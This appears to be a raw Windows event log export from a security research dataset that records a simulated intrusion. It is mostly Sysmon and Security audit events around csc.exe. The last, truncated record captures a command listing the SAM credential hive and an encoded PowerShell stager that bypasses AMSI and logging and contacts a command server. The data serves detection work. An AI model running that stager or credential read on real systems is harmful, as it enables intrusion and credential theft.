{"ImageLoaded":"C:\\Windows\\System32\\kernel32.dll","SeverityValue":2,"EventReceivedTime":"2020-09-22 04:22:44","EventID":7,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","ProcessGuid":"{b34bc01c-b453-5f69-c902-000000000900}","Opcode":"Info","EventTime":"2020-09-22 04:22:43","Signed":"true","SourceModuleType":"im_msvistalog","AccountName":"SYSTEM","Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SignatureStatus":"Valid","Severity":"INFO","Hashes":"SHA1=9044BFB6E7D920BB4586123237B512238F2EA726,MD5=B78D8D39F63C5B7B9A2F4BC31076C954,SHA256=08BE2EE23EE5A7722C4BACA3BD8F0EABA7A56302F0051E6802A36D35AB0BC41C,IMPHASH=F9F97E60CFCD78BE051D9570C88FFB6F","SourceName":"Microsoft-Windows-Sysmon","Description":"Windows NT BASE API Client DLL","Category":"Image loaded (rule: ImageLoad)","Company":"Microsoft Corporation","Keywords":-9223372036854775808,"FileVersion":"10.0.18362.1082 (WinBuild.160101.0800)","UserID":"S-1-5-18","ThreadID":4048,"EventType":"INFO","@timestamp":"2020-09-22T08:22:44.455Z","port":64545,"RecordNumber":3399414,"Task":7,"Signature":"Microsoft Windows","SourceModuleName":"eventlog","Version":3,"Product":"Microsoft Windows Operating System","Image":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe","OriginalFileName":"kernel32","UtcTime":"2020-09-22 08:22:43.553","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"Keywords":-9214364837600034816,"SeverityValue":2,"SubjectDomainName":"THESHIRE","EventID":4658,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","ExecutionProcessID":4,"Channel":"security","host":"wec.internal.cloudapp.net","SubjectUserSid":"S-1-5-21-4228717743-1032521047-1810997296-1104","EventReceivedTime":"2020-09-22 04:22:44","ProcessId":"0x1f00","ThreadID":6776,"EventType":"AUDIT_SUCCESS","Opcode":"Info","EventTime":"2020-09-22 04:22:43","Message":"The handle to an object was closed.\r\n\r\nSubject :\r\n\tSecurity ID:\t\tS-1-5-21-4228717743-1032521047-1810997296-1104\r\n\tAccount Name:\t\tpgustavo\r\n\tAccount Domain:\t\tTHESHIRE\r\n\tLogon ID:\t\t0x10A7DF\r\n\r\nObject:\r\n\tObject Server:\t\tSecurity\r\n\tHandle ID:\t\t0x164\r\n\r\nProcess Information:\r\n\tProcess ID:\t\t0x1f00\r\n\tProcess Name:\t\tC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe","@timestamp":"2020-09-22T08:22:44.456Z","ObjectServer":"Security","SubjectLogonId":"0x10a7df","SourceModuleType":"im_msvistalog","port":64545,"ProcessName":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe","RecordNumber":820557,"SubjectUserName":"pgustavo","Task":12801,"@version":"1","OpcodeValue":0,"SourceModuleName":"eventlog","Severity":"INFO","HandleId":"0x164","SourceName":"Microsoft-Windows-Security-Auditing","Version":0,"Category":"Registry","tags":["mordorDataset"],"Hostname":"WORKSTATION5.theshire.local"}
{"ImageLoaded":"C:\\Windows\\System32\\KernelBase.dll","SeverityValue":2,"EventReceivedTime":"2020-09-22 04:22:44","EventID":7,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","ProcessGuid":"{b34bc01c-b453-5f69-c902-000000000900}","Opcode":"Info","EventTime":"2020-09-22 04:22:43","Signed":"true","SourceModuleType":"im_msvistalog","AccountName":"SYSTEM","Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SignatureStatus":"Valid","Severity":"INFO","Hashes":"SHA1=0BE0E331F4F9C2ED8C9D989CDCFD10463FE3E047,MD5=D62F3401037D0D0CE1F41555B72F1B60,SHA256=B51E88CCD1517E923A7A3E21B2AFC856927D529F5C5668A072B4B12AC70AD46B,IMPHASH=16003AF856720C35351BB8C14AD0B0A8","SourceName":"Microsoft-Windows-Sysmon","Description":"Windows NT BASE API Client DLL","Category":"Image loaded (rule: ImageLoad)","Company":"Microsoft Corporation","Keywords":-9223372036854775808,"FileVersion":"10.0.18362.1049 (WinBuild.160101.0800)","UserID":"S-1-5-18","ThreadID":4048,"EventType":"INFO","@timestamp":"2020-09-22T08:22:44.458Z","port":64545,"RecordNumber":3399415,"Task":7,"Signature":"Microsoft Windows","SourceModuleName":"eventlog","Version":3,"Product":"Microsoft Windows Operating System","Image":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe","OriginalFileName":"Kernelbase.dll","UtcTime":"2020-09-22 08:22:43.553","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"Keywords":-9214364837600034816,"SeverityValue":2,"SubjectDomainName":"THESHIRE","EventID":4690,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","ExecutionProcessID":4,"Channel":"security","host":"wec.internal.cloudapp.net","SubjectUserSid":"S-1-5-21-4228717743-1032521047-1810997296-1104","EventReceivedTime":"2020-09-22 04:22:44","ProcessId":"0x1f00","ThreadID":6776,"EventType":"AUDIT_SUCCESS","Opcode":"Info","EventTime":"2020-09-22 04:22:43","Message":"An attempt was made to duplicate a handle to an object.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-5-21-4228717743-1032521047-1810997296-1104\r\n\tAccount Name:\t\tpgustavo\r\n\tAccount Domain:\t\tTHESHIRE\r\n\tLogon ID:\t\t0x10A7DF\r\n\r\nSource Handle Information:\r\n\tSource Handle ID:\t0x164\r\n\tSource Process ID:\t0x1f00\r\n\r\nNew Handle Information:\r\n\tTarget Handle ID:\t0xb0c\r\n\tTarget Process ID:\t0x4","SourceHandleId":"0x164","TargetHandleId":"0xb0c","@timestamp":"2020-09-22T08:22:44.458Z","SubjectLogonId":"0x10a7df","SourceModuleType":"im_msvistalog","port":64545,"RecordNumber":820558,"SubjectUserName":"pgustavo","SourceProcessId":"0x1f00","Task":12807,"@version":"1","OpcodeValue":0,"SourceModuleName":"eventlog","Severity":"INFO","SourceName":"Microsoft-Windows-Security-Auditing","Version":0,"TargetProcessId":"0x4","Category":"Handle Manipulation","tags":["mordorDataset"],"Hostname":"WORKSTATION5.theshire.local"}
{"Keywords":-9223372036854775808,"SeverityValue":2,"SourceImage":"C:\\windows\\system32\\conhost.exe","EventID":10,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","UserID":"S-1-5-18","SourceProcessGUID":"{b34bc01c-a8ae-5f69-7d02-000000000900}","ThreadID":4048,"TargetImage":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe","GrantedAccess":"0x1fffff","EventType":"INFO","Opcode":"Info","EventTime":"2020-09-22 04:22:43","EventReceivedTime":"2020-09-22 04:22:44","@timestamp":"2020-09-22T08:22:44.458Z","SourceModuleType":"im_msvistalog","port":64545,"AccountName":"SYSTEM","RecordNumber":3399416,"SourceProcessId":"2536","SourceThreadId":"2580","Task":10,"Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SourceModuleName":"eventlog","TargetProcessGUID":"{b34bc01c-b453-5f69-c902-000000000900}","Severity":"INFO","SourceName":"Microsoft-Windows-Sysmon","Version":3,"TargetProcessId":"7064","Category":"Process accessed (rule: ProcessAccess)","CallTrace":"C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\System32\\KERNELBASE.dll+305fe|C:\\windows\\system32\\conhost.exe+1260d|C:\\windows\\system32\\conhost.exe+12505|C:\\windows\\system32\\conhost.exe+895c|C:\\windows\\system32\\conhost.exe+f2e6|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","UtcTime":"2020-09-22 08:22:43.553","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"Keywords":-9214364837600034816,"SeverityValue":2,"SubjectDomainName":"THESHIRE","EventID":4658,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","ExecutionProcessID":4,"Channel":"security","host":"wec.internal.cloudapp.net","SubjectUserSid":"S-1-5-21-4228717743-1032521047-1810997296-1104","EventReceivedTime":"2020-09-22 04:22:44","ProcessId":"0x1f00","ThreadID":6776,"EventType":"AUDIT_SUCCESS","Opcode":"Info","EventTime":"2020-09-22 04:22:43","Message":"The handle to an object was closed.\r\n\r\nSubject :\r\n\tSecurity ID:\t\tS-1-5-21-4228717743-1032521047-1810997296-1104\r\n\tAccount Name:\t\tpgustavo\r\n\tAccount Domain:\t\tTHESHIRE\r\n\tLogon ID:\t\t0x10A7DF\r\n\r\nObject:\r\n\tObject Server:\t\tSecurity\r\n\tHandle ID:\t\t0xb0c\r\n\r\nProcess Information:\r\n\tProcess ID:\t\t0x1f00\r\n\tProcess Name:\t\tC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe","@timestamp":"2020-09-22T08:22:44.458Z","ObjectServer":"Security","SubjectLogonId":"0x10a7df","SourceModuleType":"im_msvistalog","port":64545,"ProcessName":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe","RecordNumber":820559,"SubjectUserName":"pgustavo","Task":12801,"@version":"1","OpcodeValue":0,"SourceModuleName":"eventlog","Severity":"INFO","HandleId":"0xb0c","SourceName":"Microsoft-Windows-Security-Auditing","Version":0,"Category":"Registry","tags":["mordorDataset"],"Hostname":"WORKSTATION5.theshire.local"}
{"Keywords":-9223372036854775808,"SeverityValue":2,"SourceImage":"C:\\windows\\system32\\svchost.exe","EventID":10,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","UserID":"S-1-5-18","SourceProcessGUID":"{b34bc01c-226b-5f69-1000-000000000900}","ThreadID":4048,"TargetImage":"C:\\windows\\System32\\svchost.exe","GrantedAccess":"0x1000","EventType":"INFO","Opcode":"Info","EventTime":"2020-09-22 04:22:43","EventReceivedTime":"2020-09-22 04:22:44","@timestamp":"2020-09-22T08:22:44.458Z","SourceModuleType":"im_msvistalog","port":64545,"AccountName":"SYSTEM","RecordNumber":3399417,"SourceProcessId":"908","SourceThreadId":"3440","Task":10,"Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SourceModuleName":"eventlog","TargetProcessGUID":"{b34bc01c-2271-5f69-5500-000000000900}","Severity":"INFO","SourceName":"Microsoft-Windows-Sysmon","Version":3,"TargetProcessId":"3308","Category":"Process accessed (rule: ProcessAccess)","CallTrace":"C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+222a3|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+1a172|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19e3b|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19318|C:\\windows\\SYSTEM32\\ntdll.dll+3081d|C:\\windows\\SYSTEM32\\ntdll.dll+345b4|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","UtcTime":"2020-09-22 08:22:43.553","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"SeverityValue":2,"SubjectDomainName":"THESHIRE","EventReceivedTime":"2020-09-22 04:22:44","EventID":4656,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","ExecutionProcessID":4,"Channel":"security","host":"wec.internal.cloudapp.net","ProcessId":"0x1f00","Opcode":"Info","EventTime":"2020-09-22 04:22:43","TransactionId":"{00000000-0000-0000-0000-000000000000}","ObjectServer":"Security","AccessMask":"0x20019","SourceModuleType":"im_msvistalog","ProcessName":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe","@version":"1","OpcodeValue":0,"Severity":"INFO","HandleId":"0x164","ObjectName":"\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\.NETFramework","SourceName":"Microsoft-Windows-Security-Auditing","Category":"Registry","Keywords":-9214364837600034816,"ObjectType":"Key","SubjectUserSid":"S-1-5-21-4228717743-1032521047-1810997296-1104","ThreadID":6776,"EventType":"AUDIT_SUCCESS","Message":"A handle to an object was requested.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-5-21-4228717743-1032521047-1810997296-1104\r\n\tAccount Name:\t\tpgustavo\r\n\tAccount Domain:\t\tTHESHIRE\r\n\tLogon ID:\t\t0x10A7DF\r\n\r\nObject:\r\n\tObject Server:\t\tSecurity\r\n\tObject Type:\t\tKey\r\n\tObject Name:\t\t\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\.NETFramework\r\n\tHandle ID:\t\t0x164\r\n\tResource Attributes:\t-\r\n\r\nProcess Information:\r\n\tProcess ID:\t\t0x1f00\r\n\tProcess Name:\t\tC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe\r\n\r\nAccess Request Information:\r\n\tTransaction ID:\t\t{00000000-0000-0000-0000-000000000000}\r\n\tAccesses:\t\tREAD_CONTROL\r\n\t\t\t\tQuery key value\r\n\t\t\t\tEnumerate sub-keys\r\n\t\t\t\tNotify about changes to keys\r\n\t\t\t\t\r\n\tAccess Reasons:\t\t-\r\n\tAccess Mask:\t\t0x20019\r\n\tPrivileges Used for Access Check:\t-\r\n\tRestricted SID Count:\t0","AccessReason":"-","PrivilegeList":"-","@timestamp":"2020-09-22T08:22:44.459Z","SubjectLogonId":"0x10a7df","port":64545,"RecordNumber":820560,"SubjectUserName":"pgustavo","Task":12801,"SourceModuleName":"eventlog","Version":1,"AccessList":"%%1538\r\n\t\t\t\t%%4432\r\n\t\t\t\t%%4435\r\n\t\t\t\t%%4436\r\n\t\t\t\t","RestrictedSidCount":"0","ResourceAttributes":"-","Hostname":"WORKSTATION5.theshire.local","tags":["mordorDataset"]}
{"Keywords":-9223372036854775808,"SeverityValue":2,"SourceImage":"C:\\windows\\system32\\svchost.exe","EventID":10,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","UserID":"S-1-5-18","SourceProcessGUID":"{b34bc01c-226b-5f69-1000-000000000900}","ThreadID":4048,"TargetImage":"C:\\windows\\System32\\svchost.exe","GrantedAccess":"0x1000","EventType":"INFO","Opcode":"Info","EventTime":"2020-09-22 04:22:43","EventReceivedTime":"2020-09-22 04:22:44","@timestamp":"2020-09-22T08:22:44.459Z","SourceModuleType":"im_msvistalog","port":64545,"AccountName":"SYSTEM","RecordNumber":3399418,"SourceProcessId":"908","SourceThreadId":"3440","Task":10,"Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SourceModuleName":"eventlog","TargetProcessGUID":"{b34bc01c-2271-5f69-5500-000000000900}","Severity":"INFO","SourceName":"Microsoft-Windows-Sysmon","Version":3,"TargetProcessId":"3308","Category":"Process accessed (rule: ProcessAccess)","CallTrace":"C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+222a3|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+1a172|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19e3b|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19318|C:\\windows\\SYSTEM32\\ntdll.dll+3081d|C:\\windows\\SYSTEM32\\ntdll.dll+345b4|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","UtcTime":"2020-09-22 08:22:43.553","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"ImageLoaded":"C:\\Windows\\System32\\advapi32.dll","SeverityValue":2,"EventReceivedTime":"2020-09-22 04:22:44","EventID":7,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","ProcessGuid":"{b34bc01c-b453-5f69-c902-000000000900}","Opcode":"Info","EventTime":"2020-09-22 04:22:43","Signed":"true","SourceModuleType":"im_msvistalog","AccountName":"SYSTEM","Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SignatureStatus":"Valid","Severity":"INFO","Hashes":"SHA1=35C61DDE6F8F4ED05F9C4837E2B91C886CA79F82,MD5=EA4F6E7961B4A402F6F5EC33C655260A,SHA256=5E2D103E7E1FD7CA0492E541F082D274EF6259AF2158A3562986C796C5C869DD,IMPHASH=8EEA175C33205685FB8A14876D7564DB","SourceName":"Microsoft-Windows-Sysmon","Description":"Advanced Windows 32 Base API","Category":"Image loaded (rule: ImageLoad)","Company":"Microsoft Corporation","Keywords":-9223372036854775808,"FileVersion":"10.0.18362.752 (WinBuild.160101.0800)","UserID":"S-1-5-18","ThreadID":4048,"EventType":"INFO","@timestamp":"2020-09-22T08:22:44.460Z","port":64545,"RecordNumber":3399419,"Task":7,"Signature":"Microsoft Windows","SourceModuleName":"eventlog","Version":3,"Product":"Microsoft Windows Operating System","Image":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe","OriginalFileName":"advapi32.dll","UtcTime":"2020-09-22 08:22:43.553","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"Keywords":-9214364837600034816,"SeverityValue":2,"SubjectDomainName":"THESHIRE","EventID":4658,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","ExecutionProcessID":4,"Channel":"security","host":"wec.internal.cloudapp.net","SubjectUserSid":"S-1-5-21-4228717743-1032521047-1810997296-1104","EventReceivedTime":"2020-09-22 04:22:44","ProcessId":"0x1f00","ThreadID":6776,"EventType":"AUDIT_SUCCESS","Opcode":"Info","EventTime":"2020-09-22 04:22:43","Message":"The handle to an object was closed.\r\n\r\nSubject :\r\n\tSecurity ID:\t\tS-1-5-21-4228717743-1032521047-1810997296-1104\r\n\tAccount Name:\t\tpgustavo\r\n\tAccount Domain:\t\tTHESHIRE\r\n\tLogon ID:\t\t0x10A7DF\r\n\r\nObject:\r\n\tObject Server:\t\tSecurity\r\n\tHandle ID:\t\t0x164\r\n\r\nProcess Information:\r\n\tProcess ID:\t\t0x1f00\r\n\tProcess Name:\t\tC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe","@timestamp":"2020-09-22T08:22:44.460Z","ObjectServer":"Security","SubjectLogonId":"0x10a7df","SourceModuleType":"im_msvistalog","port":64545,"ProcessName":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe","RecordNumber":820561,"SubjectUserName":"pgustavo","Task":12801,"@version":"1","OpcodeValue":0,"SourceModuleName":"eventlog","Severity":"INFO","HandleId":"0x164","SourceName":"Microsoft-Windows-Security-Auditing","Version":0,"Category":"Registry","tags":["mordorDataset"],"Hostname":"WORKSTATION5.theshire.local"}
{"Keywords":-9214364837600034816,"SeverityValue":2,"SubjectDomainName":"THESHIRE","EventID":4690,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","ExecutionProcessID":4,"Channel":"security","host":"wec.internal.cloudapp.net","SubjectUserSid":"S-1-5-21-4228717743-1032521047-1810997296-1104","EventReceivedTime":"2020-09-22 04:22:44","ProcessId":"0x1f00","ThreadID":6776,"EventType":"AUDIT_SUCCESS","Opcode":"Info","EventTime":"2020-09-22 04:22:43","Message":"An attempt was made to duplicate a handle to an object.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-5-21-4228717743-1032521047-1810997296-1104\r\n\tAccount Name:\t\tpgustavo\r\n\tAccount Domain:\t\tTHESHIRE\r\n\tLogon ID:\t\t0x10A7DF\r\n\r\nSource Handle Information:\r\n\tSource Handle ID:\t0x16c\r\n\tSource Process ID:\t0x1f00\r\n\r\nNew Handle Information:\r\n\tTarget Handle ID:\t0x3334\r\n\tTarget Process ID:\t0x4","SourceHandleId":"0x16c","TargetHandleId":"0x3334","@timestamp":"2020-09-22T08:22:44.461Z","SubjectLogonId":"0x10a7df","SourceModuleType":"im_msvistalog","port":64545,"RecordNumber":820562,"SubjectUserName":"pgustavo","SourceProcessId":"0x1f00","Task":12807,"@version":"1","OpcodeValue":0,"SourceModuleName":"eventlog","Severity":"INFO","SourceName":"Microsoft-Windows-Security-Auditing","Version":0,"TargetProcessId":"0x4","Category":"Handle Manipulation","tags":["mordorDataset"],"Hostname":"WORKSTATION5.theshire.local"}
{"ImageLoaded":"C:\\Windows\\System32\\msvcrt.dll","SeverityValue":2,"EventReceivedTime":"2020-09-22 04:22:44","EventID":7,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","ProcessGuid":"{b34bc01c-b453-5f69-c902-000000000900}","Opcode":"Info","EventTime":"2020-09-22 04:22:43","Signed":"true","SourceModuleType":"im_msvistalog","AccountName":"SYSTEM","Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SignatureStatus":"Valid","Severity":"INFO","Hashes":"SHA1=0EA4B3CFB14E49CEC0D42FF0F1FA989E69647A8F,MD5=36354D9B5B0A58A4B9A19103852C00A2,SHA256=E5A863D3F4BFEFED7D73A7B1499F81B7235BC9AE3C108065041BCB8E5446B1BB,IMPHASH=1273683626EBBA703979F188A1E64237","SourceName":"Microsoft-Windows-Sysmon","Description":"Windows NT CRT DLL","Category":"Image loaded (rule: ImageLoad)","Company":"Microsoft Corporation","Keywords":-9223372036854775808,"FileVersion":"7.0.18362.1 (WinBuild.160101.0800)","UserID":"S-1-5-18","ThreadID":4048,"EventType":"INFO","@timestamp":"2020-09-22T08:22:44.461Z","port":64545,"RecordNumber":3399420,"Task":7,"Signature":"Microsoft Windows","SourceModuleName":"eventlog","Version":3,"Product":"Microsoft Windows Operating System","Image":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe","OriginalFileName":"msvcrt.dll","UtcTime":"2020-09-22 08:22:43.553","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"Keywords":36028797018963968,"SeverityValue":2,"EventReceivedTime":"2020-09-22 04:22:44","EventID":800,"ExecutionProcessID":0,"Channel":"Windows PowerShell","host":"wec.internal.cloudapp.net","ThreadID":0,"EventType":"INFO","Opcode":"Info","EventTime":"2020-09-22 04:22:43","Message":"Pipeline execution details for command line:             ls HKLM:\\SAM\\SAM\\Domains\\Account\\Users | \n. \r\n\r\nContext Information: \r\n\tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=28437\r\n\r\n\tUserId=THESHIRE\\pgustavo\r\n\tHostName=Default Host\r\n\tHostVersion=5.1.18362.752\r\n\tHostId=da6e33cf-5ea5-45e8-b75b-b0fc1487af33\r\n\tHostApplication=C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAFIAcwBJAE8AbgBUAEEAYgBsAGUALgBQAFMAVgBlAFIAcwBpAG8AbgAuAE0AQQBqAE8AUgAgAC0ARwBlACAAMwApAHsAJABBAEMARQA2AD0AWwByAEUAZgBdAC4AQQBzAHMARQBNAGIATABZAC4ARwBlAFQAVAB5AFAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYASQBFAGAAbABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAGYAKAAkAEEAYwBlADYAKQB7ACQANABjADAARAA9ACQAQQBjAGUANgAuAEcARQB0AFYAYQBMAFUAZQAoACQATgBVAEwAbAApADsASQBmACgAJAA0AGMAMABEAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQANABjADAAZABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA0AEMAMABEAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAdgBhAGwAPQBbAEMAbwBMAEwAZQBDAHQAaQBPAE4AcwAuAEcAZQBuAEUAUgBpAEMALgBEAEkAQwB0AEkAbwBOAEEAUgB5AFsAUwB0AFIAaQBOAGcALABTAFkAUwBUAEUAbQAuAE8AYgBqAGUAQwBUAF0AXQA6ADoATgBlAHcAKAApADsAJABWAEEAbAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABWAGEATAAuAEEARABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkADQAQwAwAGQAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBhAEwAfQBFAGwAUwBFAHsAWwBTAGMAcgBJAFAAVABCAEwAbwBDAEsAXQAuACIARwBFAFQARgBpAEUAYABMAEQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQB0AFYAYQBsAFUAZQAoACQAbgBVAGwATAAsACgATgBlAFcALQBPAGIAagBFAEMAVAAgAEMATwBsAEwAZQBDAHQASQBPAG4AUwAuAEcARQBOAEUAcgBpAGMALgBIAGEAUwBoAFMAZQBUAFsAcwBUAFIASQBOAGcAXQApACkAfQAkAFIAZQBmAD0AWwBSAEUARgBdAC4AQQBzAHMARQBNAGIATAB5AC4ARwBlAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBFAGYALgBHAEUAVABGAGkARQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAHUAZQAoACQAbgBVAEwATAAsACQAdABSAFUARQApADsAfQA7AFsAUwBZAFMAVABFAE0ALgBOAEUAVAAuAFMARQBSAFYASQBDAEUAUABvAEkAbgB0AE0AQQBOAEEARwBFAHIAXQA6ADoARQB4AHAAZQBjAFQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAMAA5ADcAQwA9AE4AZQBXAC0ATwBiAGoAZQBDAFQAIABTAHkAcwB0AGUATQAuAE4ARQBUAC4AVwBlAGIAQwBsAEkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQAZQB4AHQALgBFAE4AQwBvAEQASQBOAEcAXQA6ADoAVQBOAGkAYwBPAGQAZQAuAEcAZQBUAFMAVAByAGkAbgBHACgAWwBDAG8ATgBWAEUAUgBUAF0AOgA6AEYAUgBPAG0AQgBhAHMAZQA2ADQAUwBUAFIAaQBOAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbgBlAHcAcwAuAHAAaABwACcAOwAkADAAOQA3AEMALgBIAGUAQQBEAGUAUgBzAC4AQQBEAEQAKAAnAF